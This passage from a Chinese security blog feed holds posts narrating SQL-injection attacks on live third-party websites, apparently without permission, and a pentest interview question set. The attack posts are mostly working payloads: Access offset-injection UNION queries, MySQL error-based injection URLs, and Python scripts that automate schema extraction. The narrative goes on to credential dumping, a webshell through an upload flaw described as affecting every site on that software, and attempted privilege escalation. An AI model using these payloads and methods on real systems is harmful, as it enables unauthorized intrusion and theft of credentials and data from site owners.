src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.11/6.png" alt="6"></p><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,a.*,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>, * <span class="hljs-keyword">from</span> (tbladmin <span class="hljs-keyword">as</span> a <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> tbladmin <span class="hljs-keyword">as</span> b <span class="hljs-keyword">on</span> a.id=b.id) - 发生变化</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.11/7.png" alt="7"></p><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,a.*,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>, * <span class="hljs-keyword">from</span> (tbladmin <span class="hljs-keyword">as</span> a <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> tbladmin <span class="hljs-keyword">as</span> b <span class="hljs-keyword">on</span> a.id=b.id) - 继续变化</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.11/8.png" alt="8"></p><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="hljs-keyword">select</span> a.*,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>, * <span class="hljs-keyword">from</span> (tbladmin <span class="hljs-keyword">as</span> a <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> tbladmin <span class="hljs-keyword">as</span> b <span class="hljs-keyword">on</span> a.id=b.id) - 同时显示</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.11/9.png" alt="9"></p><h1 id="完结"><a href="#完结" class="headerlink" title="完结"></a>完结</h1><p>最后可以看到，账号密码一起显示在了网页上，通过二者的联合使用，爆出账号密码的几率想必会增加不少。</p><p>参考文章：</p><p><a href="https://blog.csdn.net/Fly_hps/article/details/79415714" target="_blank" rel="noopener">https://blog.csdn.net/Fly_hps/article/details/79415714</a></p><p><a href="https://gh0st.cn/archives/2017-03-08/1" target="_blank" rel="noopener">https://gh0st.cn/archives/2017-03-08/1</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/r00tSe7en/pictures/master/2018.9.12/sql.jpg&quot; alt&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;理解一个东西，然后去发散思维思考，总会有意想不到的收获。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="https://www.se7ensec.cn/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="SQL注入" scheme="https://www.se7ensec.cn/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>记一次Access偏移注入</title>
    <link href="https://www.se7ensec.cn/2019/03/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Access%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5/"/>
    <id>https://www.se7ensec.cn/2019/03/10/记一次Access偏移注入/</id>
    <published>2019-03-10T14:30:24.000Z</published>
    <updated>2019-03-10T15:28:31.735Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.10/1.png" alt="1"></p><blockquote><p>足够猥琐的思路，往往能带来意想不到的效果。</p></blockquote><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一直想找个目标站，练习一下Access的偏移注入，今天遇见个站，用Sqlmap只能跑出来表名，好的就它了。</p><p><strong>已知表名：tbladmin</strong></p><h1 id="偏移注入"><a href="#偏移注入" class="headerlink" title="偏移注入"></a>偏移注入</h1><h2 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h2><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by 12</span><br></pre></td></tr></table></figure><h2 id="爆出显示位"><a href="#爆出显示位" class="headerlink" title="爆出显示位"></a>爆出显示位</h2><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span> <span class="hljs-keyword">from</span> tbladmin</span><br></pre></td></tr></table></figure><h2 id="使用偏移注入"><a href="#使用偏移注入" class="headerlink" title="使用偏移注入"></a>使用偏移注入</h2><p>由于列名猜解不出来（后面有猥琐思路），所以使用偏移注入</p><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,* <span class="hljs-keyword">from</span> tbladmin - 报错</span><br><span class="line"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,* <span class="hljs-keyword">from</span> tbladmin - 报错</span><br><span class="line">....</span><br><span class="line"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,* <span class="hljs-keyword">from</span> tbladmin - 正常</span><br></pre></td></tr></table></figure><p>说明了tbladmin表下有8个字段, * 代表了所有字段，比如查 tbladmin 表，它有几个字段，那么 * 就代表几个字段</p><h3 id="偏移注入的基本公式"><a href="#偏移注入的基本公式" class="headerlink" title="偏移注入的基本公式"></a>偏移注入的基本公式</h3><p><strong>order by 出来的字段数减去 * 号前的字段数，然后再用order by 出来的字段数减去2倍刚才得出来的答案</strong></p><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">即 12-8=4 ，12-2*4=4</span><br></pre></td></tr></table></figure><p>关于为什么要减去乘2的问题：由于这个(tbladmin as a inner join tbladmin as b on a.id=b.id)是tbladmin表自连接的，这样from 后面的表就会成为字段数加倍的表</p><p>这样就可以使 * 代表的字段拓宽，加大账号，密码在显示位出现的几率</p><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,* <span class="hljs-keyword">from</span> (tbladmin <span class="hljs-keyword">as</span> a <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> tbladmin <span class="hljs-keyword">as</span> b <span class="hljs-keyword">on</span> a.id=b.id)</span><br></pre></td></tr></table></figure><p>当前字段数已经为：4+4*2 = 12 = 12，这条语句显然是合法的</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.10/2.png" alt="2"></p><p>现在可以看到，只出现了账号admin，我们还需要密码，所以继续打乱顺序</p><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,a.id,* <span class="hljs-keyword">from</span> (tbladmin <span class="hljs-keyword">as</span> a <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> tbladmin <span class="hljs-keyword">as</span> b <span class="hljs-keyword">on</span> a.id=b.id) - 页面无变化</span><br><span class="line"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,a.id,b.id,* <span class="hljs-keyword">from</span> (tbladmin <span class="hljs-keyword">as</span> a <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> tbladmin <span class="hljs-keyword">as</span> b <span class="hljs-keyword">on</span> a.id=b.id) - <span class="hljs-keyword">admin</span>变成<span class="hljs-number">1</span></span><br></pre></td></tr></table></figure><h3 id="这里有个偏移注入的核心问题"><a href="#这里有个偏移注入的核心问题" class="headerlink" title="这里有个偏移注入的核心问题"></a>这里有个偏移注入的核心问题</h3><p>当前字段数已经为：4+2+4*2 = 14 &gt; 12，但这条语句却依然是合法的，为什么呢？</p><p>因为 a.id 和 b.id 在 * 里是有的，所以计算机会自动去掉重复的， 保持集合里元素的唯一性，这样一来最终查询效果的一样，但是里面字段排列顺序却被打乱了，所以才造成了偏移注入的产生。</p><p>目前我们已经进行了两次打乱，但是密码还是没有偏移到可显示的位置，这时，我们就需要继续来打乱顺序</p><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="hljs-keyword">select</span> a.id,b.id,c.id,* <span class="hljs-keyword">from</span> ((tbladmin <span class="hljs-keyword">as</span> a <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> tbladmin <span class="hljs-keyword">as</span> b <span class="hljs-keyword">on</span> a.id=b.id) <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> tbladmin <span class="hljs-keyword">as</span> c <span class="hljs-keyword">on</span> a.id=c.id)</span><br></pre></td></tr></table></figure><p>当前字段数已经为：0+4*3 = 12 = 12，所以这条语句还是合法的</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.10/3.png" alt="3"></p><p>继续打乱</p><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="hljs-keyword">select</span> a.id,b.id,* <span class="hljs-keyword">from</span> ((tbladmin <span class="hljs-keyword">as</span> a <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> tbladmin <span class="hljs-keyword">as</span> b <span class="hljs-keyword">on</span> a.id=b.id) <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> tbladmin <span class="hljs-keyword">as</span> c <span class="hljs-keyword">on</span> a.id=c.id)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.10/4.png" alt="4"></p><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="hljs-keyword">select</span> a.id,* <span class="hljs-keyword">from</span> ((tbladmin <span class="hljs-keyword">as</span> a <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> tbladmin <span class="hljs-keyword">as</span> b <span class="hljs-keyword">on</span> a.id=b.id) <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> tbladmin <span class="hljs-keyword">as</span> c <span class="hljs-keyword">on</span> a.id=c.id)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.10/5.png" alt="5"></p><p>至此，成功完成，拿去解密发现，WTF，解不出来。。。：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.10/6.png" alt="6"></p><h1 id="联合注入（猥琐）"><a href="#联合注入（猥琐）" class="headerlink" title="联合注入（猥琐）"></a>联合注入（猥琐）</h1><p>有时候渗透的思路真是要猥琐至极才好，我沉思了几分钟之后，灵光一闪，掏出了我的御剑珍藏版，扫出了后台（为什么这里要写出来呢，感觉可以算是一种思路）</p><h2 id="看下登陆框源码"><a href="#看下登陆框源码" class="headerlink" title="看下登陆框源码"></a>看下登陆框源码</h2><p>凭借我多年老司机的经验，这个名字就有可能是列名了：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.10/7.png" alt="7"></p><h2 id="直接联合查询"><a href="#直接联合查询" class="headerlink" title="直接联合查询"></a>直接联合查询</h2><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,admin_name,admin_pass,4,5,6,7,8,9,10,11,12 from tbladmin</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.10/8.png" alt="8"></p><h1 id="登陆后台-GetShell"><a href="#登陆后台-GetShell" class="headerlink" title="登陆后台+GetShell"></a>登陆后台+GetShell</h1><p>但是现在出来依然是admin，直接在Sqlmap里面把表名，列名都指定出来，去dump看看还有没有其他账户</p><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u url -T tbladmin -C admin_name,admin_pass <span class="hljs-comment">--dump</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.10/9.png" alt="9"></p><p>发现ljy账户的密码是可以解密的，成功登陆后台，找到一处任意文件上传成功getshell：</p><p>{  顺带说一下，这个文件上传链接固定，且不需要登陆，是一个通杀，凡是使用该程序的站点，基本都可以秒下来。}</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.10/10.png" alt="10"></p><p>这次又是个内网的机器，最近遇到的有点多，用了几个新出的exp，提权失败了，反弹msf也没成功。。。暂时放弃</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.10/11.png" alt="11"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.10/1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;足够猥琐的思路，往往能带来意想不到的效果。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="https://www.se7ensec.cn/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="SQL注入" scheme="https://www.se7ensec.cn/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>记一次曲折的报错注入</title>
    <link href="https://www.se7ensec.cn/2019/03/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    <id>https://www.se7ensec.cn/2019/03/06/记一次曲折的报错注入/</id>
    <published>2019-03-06T14:30:24.000Z</published>
    <updated>2019-12-05T17:13:01.493Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.06/1.png" alt="1"></p><blockquote><p>机缘巧合，查询旁站时随手点开的一个网站，加单引号 <code>&#39;</code> 页面报错，同时爆出的还有sql查询语句，程序版本ThinkPHP V5.0.14，测试了下前一阵子爆出来的exp，应该也是修复了。</p></blockquote><a id="more"></a><h1 id="尝试联合查询注入"><a href="#尝试联合查询注入" class="headerlink" title="尝试联合查询注入"></a>尝试联合查询注入</h1><p>首先尝试闭合，构造注入语句：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/pc/category/index/id/48) %23.html - 正常显示，闭合成功</span><br><span class="line">http://xxx.com/pc/category/index/id/48) and &apos;1&apos;=&apos;1&apos; %23.html - 正常显示</span><br><span class="line">http://xxx.com/pc/category/index/id/48) and &apos;1&apos;=&apos;2&apos; %23.html - 页面报错</span><br><span class="line">http://xxx.com/pc/category/index/id/48) order by 1 %23.html - order by 1 正常</span><br><span class="line">http://xxx.com/pc/category/index/id/48) order by 2 %23.html - order by 2 出现谜之报错，纠结了一阵</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.06/2.png" alt="2"></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/pc/category/index/id/48) order by (2.html - 这样构造就可以正常了，测试最大为30</span><br></pre></td></tr></table></figure><h2 id="失败"><a href="#失败" class="headerlink" title="失败"></a>失败</h2><p>联合查询来一下试试，报错了，之后尝试各种方法去闭合均报错，只好暂时放弃了，没了头绪</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/pc/category/index/id/48) union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 %23.html</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.06/3.png" alt="3"></p><h1 id="尝试报错注入"><a href="#尝试报错注入" class="headerlink" title="尝试报错注入"></a>尝试报错注入</h1><p>时间到了晚上，多亏了漂亮仔师傅的提醒，还有这么一种一直被自己忽略的注入，传送门：<a href="https://www.cnblogs.com/zlgxzswjy/p/6692729.html" target="_blank" rel="noopener">报错注入</a>，学习了一下,开始构造语句：</p><h2 id="暴库"><a href="#暴库" class="headerlink" title="暴库"></a>暴库</h2><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/pc/category/index/id/48) and(select 1 from(select count(*),concat((select (select (select concat(0x7e,schema_name,0x7e))) from information_schema.schemata  limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a.html - 爆出库名fangbiao，一共就两个，还好库不多</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.06/4.png" alt="4"></p><h2 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h2><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/pc/category/index/id/48) and(select 1 from(select count(*),concat((select (select (select concat(0x7e,table_name,0x7e))) from information_schema.tables where table_schema=0x66616E676269616F limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a.html</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.06/5.png" alt="5"></p><p>总共有42张表，一个一个手动弄出来得累死，写了个脚本，表名结果太多我就不全列出来了</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> re</span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">43</span>):</span><br><span class="line">    Response = requests.get(<span class="hljs-string">'http://xxx.com/pc/category/index/id/48)%20and(select%201%20from(select%20count(*),concat((select%20(select %20(select%20concat(0x7e,table_name,0x7e)))%20from%20information_schema.tables%20where%20table_schema=0x66616E676269616F%20limit%20&#123;0&#125;,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a'</span>.format(str(i)))</span><br><span class="line">    array=(re.findall(<span class="hljs-string">"violation: 1062 Duplicate entry '~(.*?)~1' for key"</span>, Response.text))</span><br><span class="line">    print(array[<span class="hljs-number">1</span>])</span><br></pre></td></tr></table></figure><h2 id="爆列"><a href="#爆列" class="headerlink" title="爆列"></a>爆列</h2><p>这里就遇到一个坑了,继续构造正常的报错注入语句，url太长，超出服务器接受范围，直接报错400，又没了头绪，卡住</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/pc/category/index/id/48) and(select 1 from(select count(*),concat((select (select (select concat(0x7e,column_name,0x7e))) from information_schema.columns where table_schema=0x66616E676269616F and table_name=71735F61646D696E5F6D656E75 limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a.html</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.06/6.png" alt="6"></p><p>此时已经第二天上午，突然想到能不能给它缩短下，如果去掉表名限制，那么就是查出库里所有的列，试了一下，果然，成功爆出来了列名</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/pc/category/index/id/48) and(select 1 from(select count(*),concat((select (select (select concat(0x7e,column_name,0x7e))) from information_schema.columns where table_schema=0x66616E676269616F limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a.html</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.06/7.png" alt="7"></p><p>这里测了下，405个列，果断掏出脚本改改就安排上了</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> re</span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">406</span>):</span><br><span class="line">    Response = requests.get(<span class="hljs-string">'http://xxx.com/pc/category/index/id/48)%20and(select%201%20from(select%20count(*),concat((select%20(select%20(select%20concat(0x7e,column_name,0x7e)))%20from%20information_schema.columns%20where%20table_schema=0x66616E676269616F%20limit%20&#123;0&#125;,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a'</span>.format(str(i)))</span><br><span class="line">    array=(re.findall(<span class="hljs-string">"violation: 1062 Duplicate entry '~(.*?)~1' for key"</span>, Response.text))</span><br><span class="line">    print(array[<span class="hljs-number">1</span>])</span><br></pre></td></tr></table></figure><p>完美跑出了405个列，仔细看了看结果，选几个看起来特征比较明显的来测吧，没必要全部测试</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username</span><br><span class="line">user_pass</span><br><span class="line">user_nickname</span><br><span class="line">has_admin</span><br></pre></td></tr></table></figure><h2 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h2><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/pc/category/index/id/48) and(select 1 from(select count(*),concat((select (select (select concat(0x7e,字段名,0x7e))) from fangbiao.表名 limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a.html</span><br></pre></td></tr></table></figure><p>我的想法是用以上url，先固定一个列名，然后遍历所有表名，如果当前列在当前表名中，就会有数据内容返回</p><p>本来想继续用脚本，思路就是脚本里按行读取tables.txt（按行存放的表名）的每一行内容，去拼接url，然后获取返回内容中有没有数据，结果返回的内容全为400了</p><p>这里用burp的爆破功能，可以达到一样的效果，唯一的不足之处就是要手动查看返回包了，尝试下user_pass，发现出来了数据，其他获取数据方法同理</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.06/8.png" alt="8"></p><h1 id="收工"><a href="#收工" class="headerlink" title="收工"></a>收工</h1><p>爆破出来的后台登陆地址被302跳转了，然后就没再测下去，其实也没心思再看下去了，这两天基本全在弄这个东西，之所以坚持要搞出来也是因为想弄清楚报错注入的利用方式，这次折腾完了又收获不少，文章看似很顺利，但是亲自上手就会发现坑真的不少，总结一下，留做纪念吧。（啥时候才能变成dalao啊）</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.06/1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;机缘巧合，查询旁站时随手点开的一个网站，加单引号 &lt;code&gt;&amp;#39;&lt;/code&gt; 页面报错，同时爆出的还有sql查询语句，程序版本ThinkPHP V5.0.14，测试了下前一阵子爆出来的exp，应该也是修复了。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="https://www.se7ensec.cn/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="SQL注入" scheme="https://www.se7ensec.cn/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>一套渗透测试岗面试题</title>
    <link href="https://www.se7ensec.cn/2019/03/03/%E4%B8%80%E5%A5%97%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B2%97%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    <id>https://www.se7ensec.cn/2019/03/03/一套渗透测试岗面试题/</id>
    <published>2019-03-03T14:30:24.000Z</published>
    <updated>2019-03-03T15:08:28.498Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.03/STCS.jpg" alt></p><blockquote><p>转载：阿里安全应急响应中心微信公众号</p></blockquote><a id="more"></a><p><strong>1.拿到一个待检测的站，你觉得应该先做什么？</strong></p><p>​    1)信息收集<br>​        1，获取域名的whois信息,获取注册者邮箱姓名电话等。<br>​        2，查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。<br>​        3，查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞<br>​        4，查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。<br>​        5，扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针<br>​        6，google hack 进一步探测网站的信息，后台，敏感文件<br>​    2）漏洞扫描<br>​        开始检测漏洞，如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含，<br>​        远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等<br>​    3）漏洞利用<br>​        利用以上的方式拿到webshell，或者其他权限<br>​    4）权限提升<br>​        提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,巴西烤肉，linux脏牛漏洞，linux内核版本漏洞提权，linux下的mysql system提权以及oracle低权限提权<br>​    5) 日志清理<br>​    6）总结报告及修复方案</p><p><strong>2.判断出网站的CMS对渗透有什么意义？</strong></p><p>​    查找网上已曝光的程序漏洞。</p><p>​    如果开源，还能下载相对应的源码进行代码审计。</p><p><strong>3.一个成熟并且相对安全的CMS，渗透时扫目录的意义？</strong></p><p>​    敏感文件、二级目录扫描</p><p>​    站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点</p><p><strong>4.常见的网站服务器容器。</strong></p><p>​    IIS、Apache、nginx、Lighttpd、Tomcat</p><p><strong>5.mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？</strong></p><p>​    root权限以及网站的绝对路径。</p><p><strong>6.目前已知哪些版本的容器有解析漏洞，具体举例。</strong></p><p>​    <strong>IIS 6.0</strong><br>​    /xx.asp/xx.jpg “xx.asp”是文件夹名</p><p>​    IIS 7.0/7.5<br>​    默认Fast-CGI开启，直接在url中图片地址后面输入/1.php，会把正常图片当成php解析</p><p>​    Nginx<br>​    版本小于等于0.8.37，利用方法和IIS 7.0/7.5一样，Fast-CGI关闭情况下也可利用。<br>​    空字节代码 xxx.jpg.php</p><p>​    Apache<br>​    上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左判断后缀</p><p>​    lighttpd<br>​    xx.jpg/xx.php，<strong>不全,请小伙伴们在评论处不吝补充，谢谢！</strong></p><p><strong>7.如何手工快速判断目标站是windows还是linux服务器？</strong></p><p>​    linux大小写敏感,windows大小写不敏感。</p><p><strong>8.为何一个mysql数据库的站，只有一个80端口开放？</strong></p><p>​    更改了端口，没有扫描出来。</p><p>​    站库分离。</p><p>​    3306端口不对外开放</p><p><strong>9.无法连接3389的几种情况</strong></p><p>​    没开放3389 端口</p><p>​    端口被修改</p><p>​    防护拦截</p><p>​    处于内网(需进行端口转发)</p><p><strong>10.如何突破注入时字符被转义？</strong></p><p>​    宽字符注入</p><p>​    hex编码绕过</p><p><strong>11.在某后台新闻编辑界面看到编辑器，应该先做什么？</strong></p><p>​    